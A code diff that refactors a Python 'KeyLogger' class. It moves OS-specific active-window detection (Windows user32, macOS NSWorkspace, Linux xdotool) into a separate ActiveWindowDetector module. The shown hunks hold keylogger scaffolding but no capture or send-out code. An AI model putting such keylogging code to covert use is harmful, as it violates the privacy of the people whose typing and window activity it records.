@@ -3,8 +3,8 @@ import threading
 import ctypes
 import time
 import platform
-import subprocess
 from ctypes import wintypes
+from activ_windo import ActiveWindowDetector
 
 
 class KeyLogger:
@@ -13,7 +13,7 @@ class KeyLogger:
         self.lock = threading.Lock()
         self.listener = None
         self.platform_system = platform.system()
-
+        self.window_detector = ActiveWindowDetector()
         if self.platform_system == "Windows":
             self.user32 = ctypes.WinDLL('user32', use_last_error=True)
             self.windows_api()
@@ -54,35 +54,9 @@ class KeyLogger:
             self.listener.stop()
 
     def get_active_window(self):
-        if self.platform_system == "Windows":
-            return self.get_active_window_windos()
-        elif self.platform_system == "Linux":
-            return self.get_active_window_linox()
-        elif self.platform_system == "Darwin":
-            return self.get_active_window_mac()
-        return "Unsupported OS"
+        return self.window_detector.get_active_window_name()
 
-    def get_active_window_windos(self):
-        """קבלת שם החלון הפעיל"""
-        hwnd = self.user32.GetForegroundWindow()
-        length = 256
-        buffer = ctypes.create_unicode_buffer(length)
-        self.user32.GetWindowTextW(hwnd, buffer, length)
-        return buffer.value
 
-    def get_active_window_mac(self):
-        if self.platform_system == "Darwin":
-            from AppKit import NSWorkspace
-            """פונקציה שמחזירה את שם החלון הפעיל ב-macOS באמצעות NSWorkspace"""
-            return NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()
-
-    def get_active_window_linox(self):
-        """פונקציה שמחזירה את שם החלון הפעיל ב-Linux באמצעות הפקודה xdotool"""
-        try:
-            output = subprocess.check_output(["xdotool", "getwindowfocus", "getwindowname"])
-            return output.decode().strip()
-        except Exception:
-            return "Unknown Window"
 
     def get_keyboard_layout(self):
         """קבלת מזהה פריסת המקלדת הנוכחית"""
